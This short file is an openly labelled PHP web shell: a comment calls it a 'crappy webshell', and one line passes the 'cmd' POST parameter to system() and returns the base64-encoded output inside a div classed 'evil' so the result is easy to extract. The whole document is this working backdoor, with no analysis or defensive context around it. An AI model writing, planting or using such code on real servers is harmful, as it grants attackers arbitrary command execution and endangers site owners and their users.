<!--
crappy webshell which embeds command output as a b64 string within a uniquely-classed div for ez extraction
-->
<?php echo "<div class=\"evil\">".base64_encode(system($_POST["cmd"]))."</div>";?>

